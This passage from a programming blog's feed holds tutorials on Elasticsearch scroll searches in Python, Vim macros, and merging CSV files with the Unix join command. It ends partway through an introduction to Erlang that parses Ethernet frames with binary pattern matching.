&lt;p&gt;As shown above, you can think of any type of filters without having to
fight with json syntax and stuff. For more info on the different types of
ES filter, see
&lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/2.0/query-dsl.html"&gt;ES offical query DSL&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Query in batch&lt;/h3&gt;
&lt;p&gt;The next very interesting feature is the ability to perform
&lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-request-scroll.html"&gt;scroll searches&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This is very efficient when you need to retrieve a bunch of documents/results on
a very large index. And it's quite elegant in python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;elasticsearch&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;elasticsearch_dsl&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Search&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Q&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;F&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;es_scroll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="c1"&gt;# Initialize the scroll&lt;/span&gt;
    &lt;span class="n"&gt;gotten&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;scroll&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;SCROLLDURATION&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;search_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;scan&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_dict&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
    &lt;span class="n"&gt;sid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;_scroll_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;total&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;batchgot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;total&lt;/span&gt;

    &lt;span class="c1"&gt;# scrolling through this view&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;batchgot&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;scroll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;scroll_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;sid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;scroll&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;SCROLLDURATION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="n"&gt;sid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;_scroll_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
      &lt;span class="n"&gt;batchgot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
      &lt;span class="n"&gt;gotten&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;batchgot&lt;/span&gt;
      &lt;span class="c1"&gt;# do something with the results&lt;/span&gt;
      &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;gotten&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Scroll searches provide you with a kind of snapshot of your data and
allows you to retrieve it in batch. Called
&lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-request-scroll.html#scroll-search-context"&gt;Search context&lt;/a&gt;,
it could be seen as a view in SQL databases.&lt;/p&gt;
&lt;p&gt;The parameter &lt;code&gt;SCROLLDURATION&lt;/code&gt; defines how long the view of the data is to be
kept (this is updated at each scroll's call).
The function &lt;code&gt;func&lt;/code&gt; is called after each batch to handle the results.&lt;/p&gt;
&lt;p&gt;This is very convenient and much faster than querying ES one document at a time !&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Happy searches in bigdata&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="bigdata searches" src="https://deadc0de.re/gifs/bigdata.gif"&gt;&lt;/p&gt;</content><category term="elasticsearch"></category><category term="python"></category><category term="programming"></category></entry><entry><title>Vim's macro</title><link href="https://deadc0de.re/articles/vim-macro.html" rel="alternate"></link><published>2016-01-14T00:00:00+01:00</published><updated>2016-01-14T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-01-14:/articles/vim-macro.html</id><summary type="html">&lt;p&gt;A small introduction to vim's macros with examples&lt;/p&gt;</summary><content type="html">&lt;p&gt;Vim's macros are very efficient, elegant and worth checking out.
If you already like the &lt;em&gt;dot&lt;/em&gt; (.) command, you will love macros.
Vim's macros allow you to repeat a &lt;em&gt;recording&lt;/em&gt; of
a sequence of command.&lt;/p&gt;
&lt;p&gt;For the following examples, I will use this content,
the goal is to remove the spaces and the trailing commas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;a, 2,
b, 3,
c, 4,
d, 5,
e, 6,
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Using visual block mode&lt;/h2&gt;
&lt;p&gt;Although this article is about using macros, I will start with the way I was doing it
before I knew about macro. As you'll see later, macros are way more elegant !&lt;/p&gt;
&lt;p&gt;This will be done using the visual block mode of vim, selecting a full column and then
applying a command to the entire column.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Select the spaces and delete them&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;f&amp;lt;space&amp;gt;&amp;lt;CTRL&amp;gt;v99jx
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Go to the end of the line, select the commas and delete them&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$&amp;lt;CTRL&amp;gt;v99jx
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here's a description of the different steps above:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;f&amp;lt;space&amp;gt;&lt;/code&gt; goes to the first space&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;CTRL&amp;gt;v&lt;/code&gt; enters visual block mode&lt;/li&gt;
&lt;li&gt;&lt;code&gt;99j&lt;/code&gt; applies 99 times &lt;code&gt;j&lt;/code&gt; in order to select the entire column in the file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;x&lt;/code&gt; deletes everything that's being selected&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&lt;/code&gt; goes to the end of the line&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is a little screencast of this execution:&lt;/p&gt;
&lt;p&gt;&lt;img alt="vim visual column" src="https://deadc0de.re/gifs/vim-col.gif"&gt;&lt;/p&gt;
&lt;h2&gt;Using a macro I&lt;/h2&gt;
&lt;p&gt;With a macro, you can record a single execution on the first line and then
execute it on all the subsequent lines.
Using macro in vim is quite easy: the recording is started with
&lt;code&gt;q&amp;lt;register&amp;gt;&lt;/code&gt; and ended it with &lt;code&gt;q&lt;/code&gt;. It is then applied using &lt;code&gt;@&amp;lt;register&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Try it:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;start recording (here in register &lt;code&gt;a&lt;/code&gt;): &lt;code&gt;qa&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;everything is now being recorded and saved in register &lt;em&gt;a&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;find the next space: &lt;code&gt;f&amp;lt;space&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;delete it: &lt;code&gt;x&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;go to the end of line and delete the comma: &lt;code&gt;$x&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;stop recording: &lt;code&gt;q&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can visualize the list of commands saved in the &lt;em&gt;a&lt;/em&gt; register using &lt;code&gt;:reg a&lt;/code&gt;.
And then apply that to the rest of the lines:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;select the second line up to the end of file: &lt;code&gt;:2VG&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;and execute the macro: &lt;code&gt;:norm @a&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;That's it !&lt;/p&gt;
&lt;p&gt;&lt;img alt="vim macro example 1" src="https://deadc0de.re/gifs/vim-macro-1.gif"&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;normal&lt;/code&gt; command (here I used the shortcut &lt;code&gt;norm&lt;/code&gt;) is used to execute a set of
vim commands as if you were in &lt;em&gt;normal&lt;/em&gt; mode (see &lt;code&gt;:help normal&lt;/code&gt; for more info).&lt;/p&gt;
&lt;h2&gt;Using macro II&lt;/h2&gt;
&lt;p&gt;In this second example, the goal is to change the case of the first character
and then increment the number by one using macro:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;start by going to the beginning of the file: &lt;code&gt;gg&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;record the macro in register m: &lt;code&gt;qm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;toggling case is done with tilde: &lt;code&gt;~&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;then go until the next comma: &lt;code&gt;t,&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;increment the number under the cursor with: &lt;code&gt;&amp;lt;CTRL&amp;gt;a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;and go to the next line: &lt;code&gt;+&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;finally save the macro: &lt;code&gt;q&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can then apply that macro using &lt;code&gt;@m&lt;/code&gt; multiple time (since the &lt;code&gt;+&lt;/code&gt; was used,
the macro will automatically jump on the next line). A good time saver is &lt;code&gt;@@&lt;/code&gt;
which will repeat the last macro. Another way of repeating a macro is by prepending
the command with a count as for example &lt;code&gt;99@m&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Using macro III&lt;/h2&gt;
&lt;p&gt;This is another nice example of the power of vim's macro.&lt;/p&gt;
&lt;p&gt;Our example file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;a,&amp;quot;this is a&amp;quot;
b,&amp;quot;this is b&amp;quot;
c,&amp;quot;this is c&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The goal is to replace what is inside the quotes with &lt;em&gt;is no more&lt;/em&gt;
and add the first char of the line at the beginning of that text
such that &lt;code&gt;a,"this is a"&lt;/code&gt; becomes &lt;code&gt;"a,"a is no more"&lt;/code&gt; and apply
that to all subsequent lines.&lt;/p&gt;
&lt;p&gt;Let's get started on the first line:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;start recording in buffer &lt;em&gt;q&lt;/em&gt;: &lt;code&gt;qq&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;go to the first space (any place inside the quotes will do): &lt;code&gt;f&amp;lt;space&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;and then edit the whole content inside the quotes: &lt;code&gt;ci"&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;add the new text: &lt;code&gt;&amp;lt;space&amp;gt;is no more&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;escape editing mode&lt;/li&gt;
&lt;li&gt;go the the beginning of the line: &lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;copy the char under the cursor: &lt;code&gt;yl&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;go to the first quote: &lt;code&gt;f"&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;paste the char: &lt;code&gt;p&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;stop the recording: &lt;code&gt;q&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And then apply it to all lines:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;go to the second line and select all lines up to the end of the file: &lt;code&gt;:2VG&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;apply the macro to these lines: &lt;code&gt;:norm @q&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here's a little screencast that demonstrates this execution.&lt;/p&gt;
&lt;p&gt;&lt;img alt="vim macro example 2" src="https://deadc0de.re/gifs/vim-macro-2.gif"&gt;&lt;/p&gt;
&lt;p&gt;One more thing: you can append more command to a macro by restarting the macro with the capital
letter of the register where you saved your commands. For example &lt;code&gt;qA ... q&lt;/code&gt;
for register &lt;em&gt;a&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;I hope next time you'll have to apply the same pattern to a content, you will
try to use macros !&lt;/p&gt;</content><category term="vim"></category></entry><entry><title>Shell-fu - join</title><link href="https://deadc0de.re/articles/shell-fu-join.html" rel="alternate"></link><published>2016-01-04T00:00:00+01:00</published><updated>2016-01-04T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-01-04:/articles/shell-fu-join.html</id><summary type="html">&lt;p&gt;Use unix join to concatenate multiple two-fields csv ...&lt;/p&gt;</summary><content type="html">&lt;p&gt;Let's say you have multiple two-fields csv files that you want to join on their
first field. For example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;a.csv     b.csv
-----     -----
a,1       b,10
b,2       c,20

=&amp;gt;

&lt;span class="gh"&gt;Result&lt;/span&gt;
&lt;span class="gh"&gt;------&lt;/span&gt;
a,1,0
b,2,10
c,0,20
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here are the basic join switches that will be used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-a1 -a2&lt;/strong&gt;: we also want the unpairable lines of each file&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-j1&lt;/strong&gt;: join on the first field of each file&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-t,&lt;/strong&gt;: specify the separator&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For a more complete explanation of those options, see join's man page.&lt;/p&gt;
&lt;p&gt;That is all what is needed to join two files (the sort command
is added for reference although the files are already sorted):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ join -a1 -a2 -j1 -t, &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;sort -t, -k1 a.csv&lt;span class="o"&gt;)&lt;/span&gt; &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;sort -t, -k1 b.csv&lt;span class="o"&gt;)&lt;/span&gt;
a,1
b,2,10
c,20
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So far so good, however we now don't know to which file belonged &lt;em&gt;a&lt;/em&gt; and &lt;em&gt;c&lt;/em&gt;.
Let's fix that.&lt;/p&gt;
&lt;p&gt;Now comes the &lt;strong&gt;-o&lt;/strong&gt; options which allows
to control what will be outputted. A &lt;em&gt;'0'&lt;/em&gt; means to output the
joined field and additional &lt;em&gt;FILENUM.FIELD&lt;/em&gt; which field of which file (&lt;em&gt;1&lt;/em&gt; or &lt;em&gt;2&lt;/em&gt;)
is to be added to the output. There's however a nice simplification using the keyword &lt;em&gt;auto&lt;/em&gt; that automagically
determines how many fields from each file to output based on their first line.&lt;/p&gt;
&lt;p&gt;Using &lt;strong&gt;-o 'auto'&lt;/strong&gt; the output becomes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ join -a1 -a2 -j1 -t, -o &lt;span class="s1"&gt;&amp;#39;auto&amp;#39;&lt;/span&gt; a.csv b.csv
a,1,
b,2,10
c,,20
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now it's clear that &lt;em&gt;a&lt;/em&gt; belongs to &lt;em&gt;a.csv&lt;/em&gt; and &lt;em&gt;c&lt;/em&gt; to &lt;em&gt;b.csv&lt;/em&gt;.
It is however nice to complete the command with &lt;strong&gt;-e0&lt;/strong&gt;
to replace missing fields with a &lt;em&gt;0&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ join -a1 -a2 -j1 -t, -o &lt;span class="s1"&gt;&amp;#39;auto&amp;#39;&lt;/span&gt; -e0 a.csv b.csv
a,1,0
b,2,10
c,0,20
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Perfect. Now we can add a new file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;d.csv&lt;/span&gt;
&lt;span class="gh"&gt;-----&lt;/span&gt;
a,100
x,200
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and join them all:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ join -a1 -a2 -j1 -t, -o &lt;span class="s1"&gt;&amp;#39;auto&amp;#39;&lt;/span&gt; -e0 &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;join -a1 -a2 -j1 -t, -o &lt;span class="s1"&gt;&amp;#39;auto&amp;#39;&lt;/span&gt; -e0 a.csv b.csv&lt;span class="o"&gt;)&lt;/span&gt; d.csv
a,1,0,100
b,2,10,0
c,0,20,0
x,0,0,200
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can then integrate that in some crazy one-liner or into a shell script to join any number of csv you want.&lt;/p&gt;</content><category term="bash"></category><category term="shell"></category><category term="script"></category><category term="join"></category></entry><entry><title>Getting started with erlang</title><link href="https://deadc0de.re/articles/erlang-first-steps.html" rel="alternate"></link><published>2015-12-01T00:00:00+01:00</published><updated>2015-12-01T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2015-12-01:/articles/erlang-first-steps.html</id><summary type="html">&lt;p&gt;Here’s a quick introduction to Erlang programming language as well as some basic examples to show you what it looks like and why you should try it !&lt;/p&gt;</summary><content type="html">&lt;p&gt;I recently had to learn &lt;a href="http://www.erlang.org/"&gt;Erlang&lt;/a&gt; for a project with no prior knowledge of the language.
In this blog post I’ll describe some of my discoveries, the resources I used to dive in
and two simple examples that illustrate the power (and beauty) of Erlang.&lt;/p&gt;
&lt;p&gt;I won’t dig deep into the description of the language itself. Some books, listed below,
do it much better than me. I will, however, jump directly to the heart of the language:
Erlang is a dynamically typed functional language running in a virtual machine.
It was developed by Ericson and then open sourced in 1998.&lt;/p&gt;
&lt;p&gt;Some of its awesome features are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;concurrency and distributed programming: this allows you (thanks to its lightweight processes)
to spin a lot of concurrent processes, as shown in an example down below.&lt;/li&gt;
&lt;li&gt;message passing: It uses asynchronous message passing to communicate between different processes.&lt;/li&gt;
&lt;li&gt;fault-tolerant: So you don’t impact all your software if one of your process is performing an illegal instruction.&lt;/li&gt;
&lt;li&gt;OTP: OTP (Open Telecom Platform) is an open source framework that adds a bunch of very useful libraries
to the base language. It brings abstraction libraries and design patterns (called behaviors) that you will be
very eager to use since they are really helpful when building complete software (most people
that are coding in Erlang are actually coding in Erlang/OTP).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="http://www.erlang.org/faq/introduction.html"&gt;Here&lt;/a&gt;‘s a nice introduction to Erlang.&lt;/p&gt;
&lt;p&gt;So why would you use Erlang ? Well there’s many use cases one can think of, &lt;a href="http://www.erlang.org/faq/introduction.html"&gt;here&lt;/a&gt;‘s
a list of nice use cases where Erlang is suitable (and some where it is not). But as stated on that page,
Erlang is mainly suitable for&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;“Distributed, reliable, soft real-time concurrent systems”.
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Where and how to learn Erlang&lt;/h1&gt;
&lt;p&gt;It’s not always easy to learn a new programming language. Especially when you are used to imperative
languages (procedural, object-oriented, …). A first question one might ask is “is Erlang difficult”.
I would say not really, not more than any other languages, but it is different. Yes, it is
different if you’re not used to thinking in functional. But it’s really fun and very elegant !&lt;/p&gt;
&lt;p&gt;A good starting point (which is also valid for other languages) is &lt;a href="http://learnxinyminutes.com/docs/erlang/"&gt;http://learnxinyminutes.com/docs/erlang/&lt;/a&gt;.
It gives you a quick tour of the language itself (how to declare stuff, how to use variables, what is an atom,
how to use recursion, how to export/import modules, etc). Then one might move to something more complete in order
to understand the distinctive features of the language.&lt;/p&gt;
&lt;p&gt;I’d recommend three books that really helped me dive into Erlang:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Introducing Erlang: Getting Started in Functional Programming&lt;/em&gt; by Simon St. Laurent published by
O’Reilly Media (&lt;a href="http://shop.oreilly.com/product/0636920025818.do"&gt;http://shop.oreilly.com/product/0636920025818.do&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Learn You Some Erlang for Great Good!: A Beginner’s Guide&lt;/em&gt; by Fred Hebert published by
No Starch Press (&lt;a href="http://learnyousomeerlang.com/"&gt;http://learnyousomeerlang.com/&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Designing for Scalability with Erlang/OTP: Implement Robust, Available, Fault-Tolerant Systems&lt;/em&gt;
by Francesco Cesarini and Steve Vinoski published by O’Reilly Media (&lt;a href="http://shop.oreilly.com/product/0636920024149.do"&gt;http://shop.oreilly.com/product/0636920024149.do&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(1) will give you the basics (syntax, different types (or none of them), function declaration and so on).
(2) will give you nice examples of concrete uses of the language as well as a deep-dive into OTP and finally (3)
will help the most interested of you to use Erlang for developing advanced programs using its main
features (scalability, concurrency, fault-tolerent).&lt;/p&gt;
&lt;p&gt;But as always, nothing is better than practice. So here are two examples using Erlang.&lt;/p&gt;
&lt;h1&gt;Network packet parsing using Erlang&lt;/h1&gt;
&lt;p&gt;One very elegant feature of Erlang is its pattern matching (as other functional languages).
It is very nice when one get down to, for example, parsing packets.&lt;/p&gt;
&lt;p&gt;This is an example of a function which takes as input an Ethernet frame (in binary) and prints its content:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;parse_ethernet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;
  &lt;span class="n"&gt;Src&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="n"&gt;Dst&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="mi"&gt;2048&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="n"&gt;Rest&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;binary&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;~p -&amp;gt; ~p (~p)~n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;integer_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Src&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;integer_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Dst&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt;
  &lt;span class="n"&gt;parse_ip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;parse_ethernet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;FAILED TO DECODE Ethernet~n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Isn’t it nice? Erlang will transparently try to match the packet with the first function declaration which states:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;get me a binary packet with:&lt;ul&gt;
&lt;li&gt;the first 48 bits are matched to Src&lt;/li&gt;
&lt;li&gt;the next 48 bits are matched to Dst&lt;/li&gt;
